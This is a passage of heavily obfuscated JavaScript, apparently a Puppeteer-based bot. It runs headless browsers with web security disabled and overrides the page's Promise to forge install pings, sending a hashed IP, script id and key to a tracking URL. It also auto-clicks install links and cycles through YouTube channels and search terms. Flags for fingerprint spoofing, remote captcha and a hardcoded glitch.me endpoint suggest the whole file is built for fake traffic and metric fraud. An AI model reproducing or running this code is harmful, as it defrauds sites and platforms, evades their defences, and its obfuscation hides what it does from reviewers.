              for (J = -0x597 + 0x773 * -0x1 + 0xd0a; J < -0x14cf + -0x1 * -0x19e2 + 0x1 * -0x4ff; J += 0x25ad + -0x1648 + -0x2 * 0x7b0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x576 + -0x1 * -0x175f + -0x2 * 0x8f2 | L >>> -0xcbb * 0x1 + 0x29f + 0x1 * 0xa37) + (M & N | ~M & O) + P + (0x33a337 * 0x372 + 0x95 * -0x7d8a4b + -0xe545c3e) + Q[J] << 0x35 * -0x2 + -0x875 * 0x3 + 0x19c9) << -0x156 * 0xb + -0x1 * -0x73f + 0x778 | P >>> -0x2015 + -0x2414 + 0x4444) + (L & (M = M << 0x1f81 + 0x1bf7 * 0x1 + -0x3b5a * 0x1 | M >>> -0x1eb1 + -0x7 * 0xa4 + -0x232f * -0x1) | ~L & N) + O + (0x223afdec * 0x2 + 0xcbb * -0x91505 + -0x130b9 * -0x73a8) + Q[J + (0x207b + 0x1 * -0x1d21 + -0x359)] << -0x17 * 0x2c + -0xb8a * 0x3 + 0x2692) << 0x1279 + 0x1aa5 + -0x2d19 | O >>> 0xeb1 * -0x1 + -0x72 * -0x8 + 0xb3c) + (P & (L = L << -0x2615 + -0x12aa + 0x38dd | L >>> 0xfea + -0xcbb * -0x1 + -0x1ca3 * 0x1) | ~P & M) + N + (-0x3 * 0x266edb0f + -0xaee30c38 + 0x17cb216fe) + Q[J + (-0x1 * -0x296 + 0x26e5 * 0x1 + -0x2979)] << -0x1 * -0xd91 + 0x142e + -0xa3 * 0x35) << -0x1ca8 + -0x8fd + 0x25aa | N >>> -0x1 * -0x1b73 + -0x1335 + -0x823) + (O & (P = P << 0x1 * 0x2221 + -0x2b * 0x27 + 0x57e * -0x5 | P >>> -0x946 * -0x4 + 0x2007 + 0x451d * -0x1) | ~O & L) + M + (-0xd58bdf5 + 0x5 * 0x1539a4bd + -0x2450023) + Q[J + (-0x91f + 0x92 * -0x1a + -0xbfb * -0x2)] << -0x2296 + -0xb80 + 0x2e16) << -0x1173 * 0x1 + -0xa * 0xbb + 0x18c6 * 0x1 | M >>> -0x12be * 0x1 + 0x637 + 0xca2) + (N & (O = O << 0x6 * -0x5d5 + 0xd00 + 0x2 * 0xb0e | O >>> 0x2 * 0x2fb + 0x4 * 0x256 + -0xf4c) | ~N & P) + L + (0xb9c7bb8 + 0x8d7353 * 0xd5 + 0x26caf62e * -0x1) + Q[J + (0x103c + 0x5fd + -0xf * 0x17b)] << 0x10 * -0x248 + 0x1187 + 0x653 * 0x3, N = N << -0x1 * -0x2133 + 0x1b * -0x36 + 0x7b * -0x39 | N >>> -0x1 * -0x1094 + 0xd79 + -0x1e0b;
              for (; J < 0xd3 * 0xd + 0x11 * 0x1fb + -0x2c3a; J += -0x1107 + 0xa6f * -0x1 + 0x1b7b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x57c + -0x45 * 0x4b + 0x19b8 | L >>> -0x10b0 + 0x1368 + -0x29d * 0x1) + (M ^ N ^ O) + P + (0x94c6b * 0x111e + 0xc9eedf05 + -0x1 * 0xfa3f02ee) + Q[J] << -0x9 * -0x1f3 + -0x1f79 + 0xdee) << -0x1ae6 + 0x1951 + 0x2 * 0xcd | P >>> 0xc31 + 0x2044 + -0x2c5a) + (L ^ (M = M << -0x229e + 0x1a08 + 0x8b4 | M >>> -0x1f14 + 0x4 * 0x455 + 0xdc2) ^ N) + O + (-0xf3af283 * -0xb + -0x5c272d68 + 0x2378ad68) + Q[J + (0x19b6 + 0x152 + -0x197 * 0x11)] << -0xf4 * -0x1c + 0x19a1 + -0x3451) << -0x1fb0 + -0x23cd + 0x4382 | O >>> -0x2345 + 0x1 * 0x20ef + 0x271) + (P ^ (L = L << 0xd53 + 0x3 * -0xb9e + 0x15a5 | L >>> -0x1c35 * -0x1 + -0x1721 + -0xb * 0x76) ^ M) + N + (0x2 * 0x53845968 + -0x6a93b0d3 + 0x3264e9a4) + Q[J + (0x36a + -0x2446 + 0x20de)] << 0x1b27 + 0x156 * 0x1 + -0x231 * 0xd) << 0x133a + -0x1af * 0xc + 0xff | N >>> 0x156c + -0x1395 * 0x1 + -0x1bc) + (O ^ (P = P << 0x2679 + -0x5 * 0x1e1 + 0xe7b * -0x2 | P >>> 0x91 * 0x39 + 0x180d + -0xe15 * 0x4) ^ L) + M + (-0x5dbd0360 + -0xc0abad70 + 0x18d429c71) + Q[J + (-0x6f8 + -0x67e + 0xd79)] << -0x5fe + 0x20ec + -0x1aee) << 0x20b9 + -0x16c2 + 0x43 * -0x26 | M >>> 0x726 + -0x1a3c + -0x1331 * -0x1) + (N ^ (O = O << 0x1510 + 0xf16 * 0x2 + -0x331e | O >>> 0x86d + 0x259d + -0x2e08) ^ P) + L + (0x1 * -0x2f5360ab + 0x3fe6 * -0x26a01 + -0x3 * -0x6824ed66) + Q[J + (0x5eb + 0x7af + -0xd96)] << -0x1b45 * 0x1 + -0x7da + 0x231f, N = N << 0x20d + -0x7 * 0x4d + 0x1 * 0x2c | N >>> -0x2670 + -0x1c33 * 0x1 + 0x42a5;
              for (; J < 0x7 * -0x61 + -0x25d3 * -0x1 + -0x22f0; J += -0x1798 + 0x191d + -0x20 * 0xc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x25 * 0x44 + -0x22 + -0x9ad | L >>> -0x52 * 0x4a + -0x337 + -0x481 * -0x6) + (M & N | M & O | N & O) + P - (-0x96fbd421 + 0x1 * 0x4fa98012 + 0xb8369733) + Q[J] << 0x543 + 0xd7 * 0x3 + -0x7c8) << -0x2b * 0x81 + -0x14ef + 0x2a9f | P >>> 0xa7 * 0x1f + -0x1df1 + 0x9d3) + (L & (M = M << -0x1 * -0x1b49 + 0x1164 + 0x11 * -0x29f | M >>> 0x32c + -0x2 * -0xafe + -0x1926 * 0x1) | L & N | M & N) + O - (-0x3ccf770f + 0x3813b2a8 + 0x273557d9 * 0x3) + Q[J + (0x1d0c + -0x3 * 0x36d + -0x12c4)] << -0x1 * 0x1b25 + -0x256a + -0x408f * -0x1) << 0x2 * 0x243 + 0x7bf + 0x7 * -0x1c0 | O >>> -0x4ef * 0x4 + 0x680 + -0x5 * -0x2ab) + (P & (L = L << 0xb * -0x249 + -0x87 + 0x37 * 0x78 | L >>> 0x1 * -0x4e4 + -0x1df * 0x11 + 0x24b5) | P & M | L & M) + N - (0x80a5a1da + -0xcf8eda53 + -0xbfcd7b9d * -0x1) + Q[J + (-0x1918 + 0xa * -0x61 + 0x1ce4)] << 0x2242 + 0x1c31 + 0x49 * -0xdb) << -0x23a3 + 0xbf6 * -0x1 + 0x986 * 0x5 | N >>> -0x1a79 + 0x21a8 + -0x97 * 0xc) + (O & (P = P << -0x9df + 0x1ef4 + 0x1 * -0x14f7 | P >>> 0x751 * 0x3 + 0xd16 * -0x1 + -0x1 * 0x8db) | O & L | P & L) + M - (-0x1f55 * -0x457de + 0x62f8f4bc + -0x1 * 0x7a29c04e) + Q[J + (0x11f4 + -0x3 * 0x679 + -0x2 * -0xbd)] << 0x109b + -0x1 * 0x2467 + -0x1c * -0xb5) << 0x8ad * 0x3 + 0x4 * -0x641 + -0xfe * 0x1 | M >>> 0x158 * -0xb + -0x1894 + 0x2777) + (N & (O = O << -0x1 * -0x16f0 + -0x26c3 + 0xff1 | O >>> -0x446 * -0x6 + 0x1 * 0x1b19 + -0x34bb * 0x1) | N & P | O & P) + L - (-0x1b964613 * -0x1 + 0xa37db * -0xf75 + -0x2a9 * -0x5b70e8) + Q[J + (-0x425 * 0x1 + -0xd * -0xd0 + -0x667)] << 0x10e9 + 0x14a0 + -0x2589, N = N << 0xa * 0x117 + -0xd4b + 0x283 | N >>> 0xa93 + 0x13d8 + -0xad * 0x2d;
              for (; J < -0x2643 * 0x1 + 0x256b + 0x128; J += -0x2577 + 0xde1 + 0x179b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x461 * 0x5 + -0x1e6f + 0x88f | L >>> 0x3 * 0x304 + -0xee * -0x3 + -0xbbb * 0x1) + (M ^ N ^ O) + P - (0x907eb4f * -0x1 + 0x5871025a + -0x19cbd8e1) + Q[J] << 0x123 * -0x1d + -0x199 * -0x11 + 0x5ce) << 0x2414 + 0xaae + -0x2ebd | P >>> -0x51 * 0x7 + -0x1f8c + 0x21de) + (L ^ (M = M << -0x1 * -0x1c27 + 0x1 * -0x18ef + -0x31a | M >>> 0x607 * 0x6 + -0x32 * 0x1d + -0x1e7e) ^ N) + O - (0x25b1a8bc + -0x816cb8b * 0x1 + 0x180260f9) + Q[J + (0x1a11 + 0x10fb + -0x3 * 0xe59)] << -0x1 * -0x874 + 0x186b + 0x1 * -0x20df) << -0x1858 * 0x1 + 0x150 + -0x7af * -0x3 | O >>> -0xdd6 + -0xcf * -0x2f + -0x16 * 0x118) + (P ^ (L = L << -0x113d * 0x1 + 0xb47 + 0x30a * 0x2 | L >>> 0x1035 * 0x1 + 0x1e32 + -0x2e65) ^ M) + N - (0x2c4329db + -0x6a831e82 + 0x73dd32d1) + Q[J + (0x1f65 + -0xf7c + -0xfe7)] << -0x1f * 0xc1 + -0x619 * 0x3 + -0x1 * -0x29aa) << 0x22c8 + 0x5 * -0x9d + -0x1fb2 * 0x1 | N >>> 0x1e4e * -0x1 + -0x14 * -0x107 + 0x1f9 * 0x5) + (O ^ (P = P << -0xd81 * -0x1 + 0x2 * 0xfa1 + -0x2ca5 | P >>> -0xb53 * -0x3 + 0x1e70 + -0x4067 * 0x1) ^ L) + M - (0x153e6748 + -0x42f165ee + 0x63503cd0) + Q[J + (-0x700 * -0x1 + -0x1cb8 + 0x15bb)] << 0x18d9 + -0x615 + -0x4b1 * 0x4) << 0x19 * -0x3d + -0x19 * -0xa7 + 0x73 * -0x17 | M >>> 0x59a + -0xd4 + -0x4ab) + (N ^ (O = O << 0x2117 + 0x2227 + -0x10c8 * 0x4 | O >>> -0x4bd * -0x5 + 0x67d + -0x1e2c) ^ P) + L - (0x2e3fa07 * 0x2 + 0x1 * 0x22bda79b + 0xd17a281) + Q[J + (0x3 * 0x315 + -0x26b * -0x1 + -0xba6)] << -0x1b1 + -0x23f4 + 0x1 * 0x25a5, N = N << -0xbf5 + 0xe39 * -0x1 + 0x1a4c | N >>> 0x113 + -0x743 + 0x632;
              this['h0'] = this['h0'] + L << 0x1 * -0x2171 + -0x10f3 + -0x12c * -0x2b, this['h1'] = this['h1'] + M << 0x115c + 0x60c + -0xd6 * 0x1c, this['h2'] = this['h2'] + N << 0x5 * -0x5 + 0x7 * 0x4ad + -0x1 * 0x20a2, this['h3'] = this['h3'] + O << 0x225f + 0x6f0 + -0x2d * 0xeb, this['h4'] = this['h4'] + P << -0x72 * -0x57 + -0x845 * 0x2 + -0x1634;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1 * 0xefb + 0x943 * -0x2 + 0x3a7 & 0xaa9 * 0x3 + -0xbdd * -0x1 + 0x3fb * -0xb] + w[J >> 0x1 * 0x1565 + 0x1 * 0x179b + -0x4 * 0xb3a & -0x5a7 + -0x124 * -0x1f + 0x1e * -0xfd] + w[J >> -0x1674 + -0xfcf * -0x1 + 0x6b9 & -0x6d9 * -0x3 + 0x1770 + -0x2bec] + w[J >> 0x1f2 * -0x3 + 0x23d2 + -0x1dec & 0x85 * 0x2e + 0x1e34 + -0x360b * 0x1] + w[J >> -0x25d4 + 0x184c * 0x1 + 0x6ca * 0x2 & 0x30 * -0xc2 + -0x47 * 0x53 + -0xbe4 * -0x5] + w[J >> -0xbe1 * 0x1 + -0xb6 * -0x21 + -0xb8d & -0x14c9 + -0x11 * -0xc7 + 0x7a1] + w[J >> 0x11af + 0x984 + 0x1b2f * -0x1 & -0x4a6 + -0xfd5 * -0x2 + -0x1 * 0x1af5] + w[0x4 * -0x40 + 0xc4a + -0x73 * 0x19 & J] + w[K >> -0x1e94 + 0x224d + 0x39d * -0x1 & -0xd3 * -0x19 + -0x26c6 * -0x1 + -0x3b52] + w[K >> 0x551 + -0x2207 + 0x99a * 0x3 & -0x3a * 0x1d + -0x796 * -0x1 + -0x1 * 0xf5] + w[K >> 0x3ad * -0x4 + 0x61 * -0x1 + 0x1 * 0xf29 & -0x4 * 0x6c0 + 0x1 * 0x1bd + 0x1952] + w[K >> -0x13ce + -0x16d1 + -0x619 * -0x7 & -0x1733 + -0x2535 + 0x3c77] + w[K >> 0x2565 + -0x1287 * 0x1 + -0x12d2 & -0xe51 + -0x647 * 0x1 + -0x14a7 * -0x1] + w[K >> -0x1 * 0x6f1 + -0x8bb + 0x14f * 0xc & -0x1f5a + -0x2014 + 0x3f7d] + w[K >> 0x5d1 + -0x1397 * 0x1 + 0xdca & -0x12 * -0x1ca + -0x1a3 * 0x3 + 0x15 * -0x14c] + w[0x220f + 0x1fd2 + -0x41d2 & K] + w[L >> -0xc9a + 0x81f + 0x497 & 0x1261 * 0x2 + -0x55 * 0x24 + -0x18bf] + w[L >> 0x1 * 0x4d5 + 0x234d + -0x401 * 0xa & 0x265d + -0x482 + -0x54 * 0x67] + w[L >> -0x118e + -0x39d * -0x7 + -0x7a9 & -0x1619 * -0x1 + 0x1429 + -0x3 * 0xe11] + w[L >> 0x1aa * -0xc + 0xbdd * -0x1 + 0x1fe5 & -0x2b7 + 0x17f3 + -0x152d] + w[L >> -0x1173 + -0x6b3 + 0x1832 & 0xe2 * 0x27 + -0x24c4 + 0x265] + w[L >> -0x289 * -0x2 + 0xf2c + -0x1a * 0xc7 & 0x49 + 0x227 * 0x11 + -0x24d1] + w[L >> -0x3 * 0x6c7 + 0x166a + -0x211 & -0x1 * 0xc50 + 0xc57 + -0x2 * -0x4] + w[-0x1197 * -0x1 + -0xc1 * -0x26 + 0x202 * -0x17 & L] + w[M >> -0x22ee + 0x1e2f + -0x4db * -0x1 & -0x180c + -0x1e8f * 0x1 + -0x1b55 * -0x2] + w[M >> -0x2 * -0x581 + -0x58e + -0x55c & 0x99 * 0x26 + 0x1f84 + -0x31 * 0x11b] + w[M >> 0x12f0 + -0x1871 + -0x1 * -0x595 & 0x166 * -0x12 + 0x1 * -0x10df + 0x150d * 0x2] + w[M >> -0x153 * 0x2 + -0x1 * -0xf48 + -0xc92 & 0x182a + -0x60f + 0xa5 * -0x1c] + w[M >> 0x1 * -0x821 + -0x8d6 + -0x1103 * -0x1 & -0xa89 + 0x1c45 + 0x19 * -0xb5] + w[M >> 0x1 * -0x994 + -0x17e3 + -0xaf * -0x31 & 0x10e9 + 0xe1f * 0x1 + 0x371 * -0x9] + w[M >> -0x17a * -0x4 + -0x5 * 0x57b + 0x1583 & -0x5 * -0x297 + -0x1ef5 + 0x1211] + w[0xa * 0x195 + -0xb50 + 0x43 * -0x11 & M] + w[N >> -0x1562 + 0x1346 + -0x238 * -0x1 & 0x1951 * -0x1 + -0x5 * -0x15a + -0x94f * -0x2] + w[N >> -0xbb3 + 0x6d9 + 0x4f2 & -0x1c * -0x77 + 0x3b8 + -0x58f * 0x3] + w[N >> -0x34c + -0xc1 * -0x2c + -0x2 * 0xee6 & 0x790 + -0x3 * -0x91a + 0x43 * -0x85] + w[N >> -0x3 * -0x3c1 + 0x45c + -0xf8f & 0x24d4 + 0xda8 + -0x10cf * 0x3] + w[N >> 0x12 * 0x10a + 0x679 * 0x5 + -0x161 * 0x25 & 0x3 * -0x707 + 0x16b6 + 0x2 * -0xc9] + w[N >> 0x5c * -0xf + -0x3 * 0x425 + 0x28d * 0x7 & -0x2e2 + -0x1267 + 0x1558] + w[N >> -0x1109 + -0x1 * -0x1693 + -0x586 & -0x1 * 0x204a + -0x1d11 * -0x1 + 0x348] + w[-0x71b * -0x3 + 0x247e + -0x39c0 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * -0x23db + 0x48 * -0x24 + -0x19a3 & -0x13d * -0x17 + 0xf4e + -0x2aca,
                J >> -0x185b + -0x1769 + -0x1 * -0x2fd4 & 0xc77 * 0x1 + 0x1 * 0x1c90 + 0x54 * -0x7a,
                J >> 0x85 * 0x11 + -0x67d * -0x2 + -0xdf * 0x19 & 0x7 * -0x34e + 0x3 * -0xc82 + 0x3da7,
                0x83d + -0x2 * -0x100f + -0x275c & J,
                K >> -0x62 + -0x1 * -0x4c7 + -0x44d & 0x2 * 0x1e1 + 0x15ae * -0x1 + -0x1 * -0x12eb,
                K >> 0x154f + 0xb7 * 0xd + -0x1e8a & 0x1 * 0x1171 + -0x1 * -0x59d + -0x160f,
                K >> 0x1d44 + -0x864 * -0x4 + 0x1 * -0x3ecc & -0xab * 0x1 + -0x1 * 0xdab + 0xf55,
                -0xc0f * -0x1 + 0x1aa1 + -0x25b1 & K,
                L >> 0x9c * 0x1 + 0x12db + -0x675 * 0x3 & -0x67f * -0x2 + 0xc9a * -0x2 + 0xd35,
                L >> 0x7 * 0x561 + -0x1ed1 + -0x3 * 0x242 & -0xeca + 0x1 * -0x7d7 + -0x3 * -0x7e0,
                L >> 0x636 + -0x34c + -0x2e2 & -0xa2d + 0x8 * 0x422 + 0x1d3 * -0xc,
                -0xd6c + 0x1199 + -0x32e & L,
                M >> -0x3 * -0x74c + 0xd * -0x6a + -0x106a & 0x2ae + -0x1048 + -0x65 * -0x25,
                M >> 0x1 * 0x2e7 + 0x2cd + 0x4 * -0x169 & -0xde9 * -0x1 + 0x269f + -0x1 * 0x3389,
                M >> 0x1ac7 + -0x1d34 + 0x275 * 0x1 & -0x19b + 0x1e0a * 0x1 + 0x10 * -0x1b7,
                0x1242 + 0x3b9 * -0x4 + -0x25f * 0x1 & M,
                N >> -0x20a * -0x1 + -0x1 * 0x25da + 0x23e8 & -0x19a9 * -0x1 + 0x281 * -0x2 + -0x13a8,
                N >> -0x67 * 0x2 + 0x2559 + -0x247b & 0xc2 + 0x3 * -0x98f + 0x1cea,
                N >> -0x1bde + 0x1d26 + -0x140 & -0x7d0 + 0xcb9 + -0x3ea,
                0x74c + -0x43 * -0x6f + 0x5 * -0x712 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * -0x2e3 + -0x1e63 + -0x2c2 * -0xa), (K = new DataView(J))['setUint32'](-0x1751 * 0x1 + -0x20c * -0xa + -0x51 * -0x9, this['h0']), K['setUint32'](0x1c * -0xdd + 0x1bc8 + -0x1cc * 0x2, this['h1']), K['setUint32'](-0x1 * -0xb9d + -0xa45 + -0x150, this['h2']), K['setUint32'](-0x1b4 + -0x2510 + -0x4da * -0x8, this['h3']), K['setUint32'](0x13f1 * 0x1 + 0x4d0 + -0x1 * 0x18b1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2638 + -0x1a21 + -0xc17];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x156 * -0x1 + 0x166d * 0x1 + 0x1 * -0x1517;
            J[0x1678 + 0xa63 + -0x287 * 0xd]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xb5 * 0x15 + 0x24a5 * 0x1 + -0x15cc] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x6d * -0x2d + 0xf72 + -0x229a), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2557 + 0x2693 + -0x4be9;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x166 * 0x6 + 0x71c + -0x9a4), Promise['resolve'](0x19ad * -0x1 + 0x256b + -0xbbd);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1b1 * -0x9 + -0x162 * -0x14 + -0x2ae1; j < -0xa71 + 0x1717 + -0xca5 * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x134d + 0x1 * 0xd03 + 0x8 * -0x22 + (0x13a8 + 0x1 * 0xb55 + -0x1345) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x17 * 0x75 + 0x237b + -0x4f * 0x95) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x25 * 0x32 + 0x1 * 0x10bb + -0x981);
    let h = e[f];
    if (c['SzpdAy'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x2db + -0x48d * 0x3 + -0xacc * -0x1, r, s, t = -0x3ec * 0x5 + -0xf60 + -0x2 * -0x117e; s = m['charAt'](t++); ~s && (r = q % (-0x15d + -0x186 + -0x2e7 * -0x1) ? r * (0x7 * 0x22c + 0x11a1 + -0x2095) + s : s, q++ % (0x1a6f + -0xe80 + -0xbeb)) ? o += String['fromCharCode'](-0x1c * 0x85 + 0x1 * 0x1feb + -0x1060 & r >> (-(0x14b6 + 0x217e + -0x3632) * q & -0xa11 + -0xe3 * -0x17 + -0xa4e)) : -0x1 * 0x1e4a + 0x1c55 + 0x1f5) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1a54 + 0x15 * 0x1ae + -0xa * 0xe5, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * 0x2437 + 0x67e + -0x2aa5 * 0x1))['slice'](-(-0x9a * -0x4 + 0x1b3 + -0x419));
        }
        return decodeURIComponent(p);
      };
      c['gEbfoO'] = i, b = arguments, c['SzpdAy'] = !![];
    }
    const j = e[0x10b + 0x1cab + -0x2 * 0xedb],
      k = f + j,
      l = b[k];
    return !l ? (h = c['gEbfoO'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x25 * 0x32 + 0x1 * 0x10bb + -0x981);
    let h = e[f];
    return h;
  }, d(b, c);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x224 + -0x3c * -0x39 + -0xf80 * 0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + V(0x8) + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + V(0x1) + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + V(0x10) + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * 0x1041 + -0x1e72 + 0x2ebd * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x19a2 + -0xbb7 * 0x3 + 0x3cd1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 